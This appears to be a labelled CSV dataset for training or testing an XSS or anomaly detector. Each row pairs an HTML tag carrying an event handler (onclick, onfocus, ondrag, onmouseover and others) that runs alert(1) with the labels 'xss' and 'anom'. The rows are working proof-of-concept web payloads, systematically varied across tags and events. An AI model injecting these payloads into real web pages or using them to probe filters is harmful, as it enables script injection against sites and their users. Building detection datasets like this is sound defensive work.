payload,attack_type,label
<select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>,xss,anom
<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>,xss,anom
"<select onbeforecopy=""alert(1)"" contenteditable>test</select>",xss,anom
"<select onbeforecut=""alert(1)"" contenteditable>test</select>",xss,anom
"<select onbeforepaste=""alert(1)"" contenteditable>test</select>",xss,anom
<select onblur=alert(1) id=x></select><input autofocus>,xss,anom
<select onchange=alert(1)><option>change me</option><option>XSS</option></select>,xss,anom
"<select onclick=""alert(1)"">test</select>",xss,anom
"<select oncontextmenu=""alert(1)"">test</select>",xss,anom
"<select oncopy=""alert(1)"" contenteditable>test</select>",xss,anom
"<select oncut=""alert(1)"" contenteditable>test</select>",xss,anom
"<select ondblclick=""alert(1)"">test</select>",xss,anom
<select onfocusout=alert(1) id=x></select><input autofocus>,xss,anom
"<select onkeydown=""alert(1)"" contenteditable>test</select>",xss,anom
"<select onkeypress=""alert(1)"" contenteditable>test</select>",xss,anom
"<select onkeyup=""alert(1)"" contenteditable>test</select>",xss,anom
"<select onmousedown=""alert(1)"">test</select>",xss,anom
"<select onmouseenter=""alert(1)"">test</select>",xss,anom
"<select onmouseleave=""alert(1)"">test</select>",xss,anom
"<select onmousemove=""alert(1)"">test</select>",xss,anom
"<select onmouseout=""alert(1)"">test</select>",xss,anom
"<select onmouseover=""alert(1)"">test</select>",xss,anom
"<select onmouseup=""alert(1)"">test</select>",xss,anom
"<select onpaste=""alert(1)"" contenteditable>test</select>",xss,anom
"<shadow draggable=""true"" ondrag=""alert(1)"">test</shadow>",xss,anom
"<shadow draggable=""true"" ondragend=""alert(1)"">test</shadow>",xss,anom
"<shadow draggable=""true"" ondragenter=""alert(1)"">test</shadow>",xss,anom
"<shadow draggable=""true"" ondragleave=""alert(1)"">test</shadow>",xss,anom
"<shadow draggable=""true"" ondragstart=""alert(1)"">test</shadow>",xss,anom
<shadow id=x tabindex=1 onactivate=alert(1)></shadow>,xss,anom
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>,xss,anom
<shadow id=x tabindex=1 onbeforedeactivate=alert(1)></shadow><input autofocus>,xss,anom
<shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>,xss,anom
<shadow id=x tabindex=1 onfocus=alert(1)></shadow>,xss,anom
<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>,xss,anom
"<shadow onbeforecopy=""alert(1)"" contenteditable>test</shadow>",xss,anom
"<shadow onbeforecut=""alert(1)"" contenteditable>test</shadow>",xss,anom
"<shadow onbeforepaste=""alert(1)"" contenteditable>test</shadow>",xss,anom
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,xss,anom
"<shadow onclick=""alert(1)"">test</shadow>",xss,anom
"<shadow oncontextmenu=""alert(1)"">test</shadow>",xss,anom
"<shadow oncopy=""alert(1)"" contenteditable>test</shadow>",xss,anom
"<shadow oncut=""alert(1)"" contenteditable>test</shadow>",xss,anom
"<shadow ondblclick=""alert(1)"">test</shadow>",xss,anom
<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>,xss,anom
"<shadow onkeydown=""alert(1)"" contenteditable>test</shadow>",xss,anom
"<shadow onkeypress=""alert(1)"" contenteditable>test</shadow>",xss,anom
"<shadow onkeyup=""alert(1)"" contenteditable>test</shadow>",xss,anom
"<shadow onmousedown=""alert(1)"">test</shadow>",xss,anom
"<shadow onmouseenter=""alert(1)"">test</shadow>",xss,anom
"<shadow onmouseleave=""alert(1)"">test</shadow>",xss,anom
"<shadow onmousemove=""alert(1)"">test</shadow>",xss,anom
"<shadow onmouseout=""alert(1)"">test</shadow>",xss,anom
"<shadow onmouseover=""alert(1)"">test</shadow>",xss,anom
"<shadow onmouseup=""alert(1)"">test</shadow>",xss,anom
"<shadow onpaste=""alert(1)"" contenteditable>test</shadow>",xss,anom
"<slot draggable=""true"" ondrag=""alert(1)"">test</slot>",xss,anom
"<slot draggable=""true"" ondragend=""alert(1)"">test</slot>",xss,anom
"<slot draggable=""true"" ondragenter=""alert(1)"">test</slot>",xss,anom
"<slot draggable=""true"" ondragleave=""alert(1)"">test</slot>",xss,anom
"<slot draggable=""true"" ondragstart=""alert(1)"">test</slot>",xss,anom
<slot id=x tabindex=1 onactivate=alert(1)></slot>,xss,anom
<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>,xss,anom
<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,xss,anom
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,xss,anom
<slot id=x tabindex=1 onfocus=alert(1)></slot>,xss,anom
<slot id=x tabindex=1 onfocusin=alert(1)></slot>,xss,anom
"<slot onbeforecopy=""alert(1)"" contenteditable>test</slot>",xss,anom
"<slot onbeforecut=""alert(1)"" contenteditable>test</slot>",xss,anom
"<slot onbeforepaste=""alert(1)"" contenteditable>test</slot>",xss,anom
<slot onblur=alert(1) tabindex=1 id=x></slot><input autofocus>,xss,anom
"<slot onclick=""alert(1)"">test</slot>",xss,anom
"<slot oncontextmenu=""alert(1)"">test</slot>",xss,anom
"<slot oncopy=""alert(1)"" contenteditable>test</slot>",xss,anom
"<slot oncut=""alert(1)"" contenteditable>test</slot>",xss,anom
"<slot ondblclick=""alert(1)"">test</slot>",xss,anom
<slot onfocusout=alert(1) tabindex=1 id=x></slot><input autofocus>,xss,anom
"<slot onkeydown=""alert(1)"" contenteditable>test</slot>",xss,anom
"<slot onkeypress=""alert(1)"" contenteditable>test</slot>",xss,anom
"<slot onkeyup=""alert(1)"" contenteditable>test</slot>",xss,anom
"<slot onmousedown=""alert(1)"">test</slot>",xss,anom
"<slot onmouseenter=""alert(1)"">test</slot>",xss,anom
"<slot onmouseleave=""alert(1)"">test</slot>",xss,anom
"<slot onmousemove=""alert(1)"">test</slot>",xss,anom
"<slot onmouseout=""alert(1)"">test</slot>",xss,anom
"<slot onmouseover=""alert(1)"">test</slot>",xss,anom
"<slot onmouseup=""alert(1)"">test</slot>",xss,anom
"<slot onpaste=""alert(1)"" contenteditable>test</slot>",xss,anom
"<small draggable=""true"" ondrag=""alert(1)"">test</small>",xss,anom
"<small draggable=""true"" ondragend=""alert(1)"">test</small>",xss,anom
"<small draggable=""true"" ondragenter=""alert(1)"">test</small>",xss,anom
"<small draggable=""true"" ondragleave=""alert(1)"">test</small>",xss,anom
"<small draggable=""true"" ondragstart=""alert(1)"">test</small>",xss,anom
<small id=x tabindex=1 onactivate=alert(1)></small>,xss,anom
<small id=x tabindex=1 onbeforeactivate=alert(1)></small>,xss,anom
<small id=x tabindex=1 onbeforedeactivate=alert(1)></small><input autofocus>,xss,anom
<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>,xss,anom
<small id=x tabindex=1 onfocus=alert(1)></small>,xss,anom
<small id=x tabindex=1 onfocusin=alert(1)></small>,xss,anom
"<small onbeforecopy=""alert(1)"" contenteditable>test</small>",xss,anom
"<small onbeforecut=""alert(1)"" contenteditable>test</small>",xss,anom
"<small onbeforepaste=""alert(1)"" contenteditable>test</small>",xss,anom
<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,xss,anom
"<small onclick=""alert(1)"">test</small>",xss,anom
"<small oncontextmenu=""alert(1)"">test</small>",xss,anom
"<small oncopy=""alert(1)"" contenteditable>test</small>",xss,anom
"<small oncut=""alert(1)"" contenteditable>test</small>",xss,anom
"<small ondblclick=""alert(1)"">test</small>",xss,anom
<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>,xss,anom
"<small onkeydown=""alert(1)"" contenteditable>test</small>",xss,anom
"<small onkeypress=""alert(1)"" contenteditable>test</small>",xss,anom
"<small onkeyup=""alert(1)"" contenteditable>test</small>",xss,anom
"<small onmousedown=""alert(1)"">test</small>",xss,anom
"<small onmouseenter=""alert(1)"">test</small>",xss,anom
"<small onmouseleave=""alert(1)"">test</small>",xss,anom
"<small onmousemove=""alert(1)"">test</small>",xss,anom
"<small onmouseout=""alert(1)"">test</small>",xss,anom
"<small onmouseover=""alert(1)"">test</small>",xss,anom
"<small onmouseup=""alert(1)"">test</small>",xss,anom
"<small onpaste=""alert(1)"" contenteditable>test</small>",xss,anom
"<source draggable=""true"" ondrag=""alert(1)"">test</source>",xss,anom
"<source draggable=""true"" ondragend=""alert(1)"">test</source>",xss,anom
"<source draggable=""true"" ondragenter=""alert(1)"">test</source>",xss,anom
"<source draggable=""true"" ondragleave=""alert(1)"">test</source>",xss,anom
"<source draggable=""true"" ondragstart=""alert(1)"">test</source>",xss,anom
<source id=x tabindex=1 onactivate=alert(1)></source>,xss,anom
<source id=x tabindex=1 onbeforeactivate=alert(1)></source>,xss,anom
<source id=x tabindex=1 onbeforedeactivate=alert(1)></source><input autofocus>,xss,anom
<source id=x tabindex=1 ondeactivate=alert(1)></source><input id=y autofocus>,xss,anom
<source id=x tabindex=1 onfocus=alert(1)></source>,xss,anom
<source id=x tabindex=1 onfocusin=alert(1)></source>,xss,anom
"<source onbeforecopy=""alert(1)"" contenteditable>test</source>",xss,anom
"<source onbeforecut=""alert(1)"" contenteditable>test</source>",xss,anom
"<source onbeforepaste=""alert(1)"" contenteditable>test</source>",xss,anom
<source onblur=alert(1) tabindex=1 id=x></source><input autofocus>,xss,anom
"<source onclick=""alert(1)"">test</source>",xss,anom
"<source oncontextmenu=""alert(1)"">test</source>",xss,anom
"<source oncopy=""alert(1)"" contenteditable>test</source>",xss,anom
"<source oncut=""alert(1)"" contenteditable>test</source>",xss,anom
"<source ondblclick=""alert(1)"">test</source>",xss,anom
<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>,xss,anom
"<source onkeydown=""alert(1)"" contenteditable>test</source>",xss,anom
"<source onkeypress=""alert(1)"" contenteditable>test</source>",xss,anom
"<source onkeyup=""alert(1)"" contenteditable>test</source>",xss,anom
"<source onmousedown=""alert(1)"">test</source>",xss,anom
"<source onmouseenter=""alert(1)"">test</source>",xss,anom
"<source onmouseleave=""alert(1)"">test</source>",xss,anom
"<source onmousemove=""alert(1)"">test</source>",xss,anom
"<source onmouseout=""alert(1)"">test</source>",xss,anom
"<source onmouseover=""alert(1)"">test</source>",xss,anom
"<source onmouseup=""alert(1)"">test</source>",xss,anom
"<source onpaste=""alert(1)"" contenteditable>test</source>",xss,anom
"<spacer draggable=""true"" ondrag=""alert(1)"">test</spacer>",xss,anom
"<spacer draggable=""true"" ondragend=""alert(1)"">test</spacer>",xss,anom
"<spacer draggable=""true"" ondragenter=""alert(1)"">test</spacer>",xss,anom
"<spacer draggable=""true"" ondragleave=""alert(1)"">test</spacer>",xss,anom
"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",xss,anom
<spacer id=x tabindex=1 onactivate=alert(1)></spacer>,xss,anom
<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>,xss,anom
<spacer id=x tabindex=1 onbeforedeactivate=alert(1)></spacer><input autofocus>,xss,anom
<spacer id=x tabindex=1 ondeactivate=alert(1)></spacer><input id=y autofocus>,xss,anom
<spacer id=x tabindex=1 onfocus=alert(1)></spacer>,xss,anom
<spacer id=x tabindex=1 onfocusin=alert(1)></spacer>,xss,anom
"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",xss,anom
"<spacer onbeforecut=""alert(1)"" contenteditable>test</spacer>",xss,anom
"<spacer onbeforepaste=""alert(1)"" contenteditable>test</spacer>",xss,anom
<spacer onblur=alert(1) tabindex=1 id=x></spacer><input autofocus>,xss,anom
"<spacer onclick=""alert(1)"">test</spacer>",xss,anom
"<spacer oncontextmenu=""alert(1)"">test</spacer>",xss,anom
"<spacer oncopy=""alert(1)"" contenteditable>test</spacer>",xss,anom
"<spacer oncut=""alert(1)"" contenteditable>test</spacer>",xss,anom
"<spacer ondblclick=""alert(1)"">test</spacer>",xss,anom
<spacer onfocusout=alert(1) tabindex=1 id=x></spacer><input autofocus>,xss,anom
"<spacer onkeydown=""alert(1)"" contenteditable>test</spacer>",xss,anom
"<spacer onkeypress=""alert(1)"" contenteditable>test</spacer>",xss,anom
"<spacer onkeyup=""alert(1)"" contenteditable>test</spacer>",xss,anom
"<spacer onmousedown=""alert(1)"">test</spacer>",xss,anom
"<spacer onmouseenter=""alert(1)"">test</spacer>",xss,anom
"<spacer onmouseleave=""alert(1)"">test</spacer>",xss,anom
"<spacer onmousemove=""alert(1)"">test</spacer>",xss,anom
"<spacer onmouseout=""alert(1)"">test</spacer>",xss,anom
"<spacer onmouseover=""alert(1)"">test</spacer>",xss,anom
"<spacer onmouseup=""alert(1)"">test</spacer>",xss,anom
"<spacer onpaste=""alert(1)"" contenteditable>test</spacer>",xss,anom
"<span draggable=""true"" ondrag=""alert(1)"">test</span>",xss,anom
"<span draggable=""true"" ondragend=""alert(1)"">test</span>",xss,anom
"<span draggable=""true"" ondragenter=""alert(1)"">test</span>",xss,anom
"<span draggable=""true"" ondragleave=""alert(1)"">test</span>",xss,anom
"<span draggable=""true"" ondragstart=""alert(1)"">test</span>",xss,anom
<span id=x tabindex=1 onactivate=alert(1)></span>,xss,anom
<span id=x tabindex=1 onbeforeactivate=alert(1)></span>,xss,anom
<span id=x tabindex=1 onbeforedeactivate=alert(1)></span><input autofocus>,xss,anom
<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>,xss,anom
<span id=x tabindex=1 onfocus=alert(1)></span>,xss,anom
<span id=x tabindex=1 onfocusin=alert(1)></span>,xss,anom
"<span onbeforecopy=""alert(1)"" contenteditable>test</span>",xss,anom
"<span onbeforecut=""alert(1)"" contenteditable>test</span>",xss,anom
"<span onbeforepaste=""alert(1)"" contenteditable>test</span>",xss,anom
<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>,xss,anom
"<span onclick=""alert(1)"">test</span>",xss,anom
"<span oncontextmenu=""alert(1)"">test</span>",xss,anom
"<span oncopy=""alert(1)"" contenteditable>test</span>",xss,anom
"<span oncut=""alert(1)"" contenteditable>test</span>",xss,anom
"<span ondblclick=""alert(1)"">test</span>",xss,anom
<span onfocusout=alert(1) tabindex=1 id=x></span><input autofocus>,xss,anom
"<span onkeydown=""alert(1)"" contenteditable>test</span>",xss,anom
"<span onkeypress=""alert(1)"" contenteditable>test</span>",xss,anom
"<span onkeyup=""alert(1)"" contenteditable>test</span>",xss,anom
"<span onmousedown=""alert(1)"">test</span>",xss,anom
"<span onmouseenter=""alert(1)"">test</span>",xss,anom
"<span onmouseleave=""alert(1)"">test</span>",xss,anom
"<span onmousemove=""alert(1)"">test</span>",xss,anom
"<span onmouseout=""alert(1)"">test</span>",xss,anom
"<span onmouseover=""alert(1)"">test</span>",xss,anom
"<span onmouseup=""alert(1)"">test</span>",xss,anom
"<span onpaste=""alert(1)"" contenteditable>test</span>",xss,anom
"<strike draggable=""true"" ondrag=""alert(1)"">test</strike>",xss,anom
"<strike draggable=""true"" ondragend=""alert(1)"">test</strike>",xss,anom
"<strike draggable=""true"" ondragenter=""alert(1)"">test</strike>",xss,anom
"<strike draggable=""true"" ondragleave=""alert(1)"">test</strike>",xss,anom
"<strike draggable=""true"" ondragstart=""alert(1)"">test</strike>",xss,anom
<strike id=x tabindex=1 onactivate=alert(1)></strike>,xss,anom
<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>,xss,anom
<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>,xss,anom
<strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>,xss,anom
<strike id=x tabindex=1 onfocus=alert(1)></strike>,xss,anom
<strike id=x tabindex=1 onfocusin=alert(1)></strike>,xss,anom
"<strike onbeforecopy=""alert(1)"" contenteditable>test</strike>",xss,anom
"<strike onbeforecut=""alert(1)"" contenteditable>test</strike>",xss,anom
"<strike onbeforepaste=""alert(1)"" contenteditable>test</strike>",xss,anom
<strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>,xss,anom
"<strike onclick=""alert(1)"">test</strike>",xss,anom
"<strike oncontextmenu=""alert(1)"">test</strike>",xss,anom
"<strike oncopy=""alert(1)"" contenteditable>test</strike>",xss,anom
"<strike oncut=""alert(1)"" contenteditable>test</strike>",xss,anom
"<strike ondblclick=""alert(1)"">test</strike>",xss,anom
<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>,xss,anom
"<strike onkeydown=""alert(1)"" contenteditable>test</strike>",xss,anom
"<strike onkeypress=""alert(1)"" contenteditable>test</strike>",xss,anom
"<strike onkeyup=""alert(1)"" contenteditable>test</strike>",xss,anom
"<strike onmousedown=""alert(1)"">test</strike>",xss,anom
"<strike onmouseenter=""alert(1)"">test</strike>",xss,anom
"<strike onmouseleave=""alert(1)"">test</strike>",xss,anom
"<strike onmousemove=""alert(1)"">test</strike>",xss,anom
"<strike onmouseout=""alert(1)"">test</strike>",xss,anom
"<strike onmouseover=""alert(1)"">test</strike>",xss,anom
"<strike onmouseup=""alert(1)"">test</strike>",xss,anom
"<strike onpaste=""alert(1)"" contenteditable>test</strike>",xss,anom
"<strong draggable=""true"" ondrag=""alert(1)"">test</strong>",xss,anom
"<strong draggable=""true"" ondragend=""alert(1)"">test</strong>",xss,anom
"<strong draggable=""true"" ondragenter=""alert(1)"">test</strong>",xss,anom
"<strong draggable=""true"" ondragleave=""alert(1)"">test</strong>",xss,anom
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",xss,anom
<strong id=x tabindex=1 onactivate=alert(1)></strong>,xss,anom
<strong id=x tabindex=1 onbeforeactivate=alert(1)></strong>,xss,anom
<strong id=x tabindex=1 onbeforedeactivate=alert(1)></strong><input autofocus>,xss,anom
<strong id=x tabindex=1 ondeactivate=alert(1)></strong><input id=y autofocus>,xss,anom
<strong id=x tabindex=1 onfocus=alert(1)></strong>,xss,anom
<strong id=x tabindex=1 onfocusin=alert(1)></strong>,xss,anom
"<strong onbeforecopy=""alert(1)"" contenteditable>test</strong>",xss,anom
"<strong onbeforecut=""alert(1)"" contenteditable>test</strong>",xss,anom
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",xss,anom
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,xss,anom
"<strong onclick=""alert(1)"">test</strong>",xss,anom
"<strong oncontextmenu=""alert(1)"">test</strong>",xss,anom
"<strong oncopy=""alert(1)"" contenteditable>test</strong>",xss,anom
"<strong oncut=""alert(1)"" contenteditable>test</strong>",xss,anom
"<strong ondblclick=""alert(1)"">test</strong>",xss,anom
<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,xss,anom
"<strong onkeydown=""alert(1)"" contenteditable>test</strong>",xss,anom
"<strong onkeypress=""alert(1)"" contenteditable>test</strong>",xss,anom
"<strong onkeyup=""alert(1)"" contenteditable>test</strong>",xss,anom
"<strong onmousedown=""alert(1)"">test</strong>",xss,anom
"<strong onmouseenter=""alert(1)"">test</strong>",xss,anom
"<strong onmouseleave=""alert(1)"">test</strong>",xss,anom
"<strong onmousemove=""alert(1)"">test</strong>",xss,anom
"<strong onmouseout=""alert(1)"">test</strong>",xss,anom
"<strong onmouseover=""alert(1)"">test</strong>",xss,anom
"<strong onmouseup=""alert(1)"">test</strong>",xss,anom
"<strong onpaste=""alert(1)"" contenteditable>test</strong>",xss,anom
"<style draggable=""true"" ondrag=""alert(1)"">test</style>",xss,anom
"<style draggable=""true"" ondragend=""alert(1)"">test</style>",xss,anom
"<style draggable=""true"" ondragenter=""alert(1)"">test</style>",xss,anom
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",xss,anom
"<style draggable=""true"" ondragstart=""alert(1)"">test</style>",xss,anom
<style id=x tabindex=1 onactivate=alert(1)></style>,xss,anom
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,xss,anom
<style id=x tabindex=1 onbeforedeactivate=alert(1)></style><input autofocus>,xss,anom
<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>,xss,anom
<style id=x tabindex=1 onfocus=alert(1)></style>,xss,anom
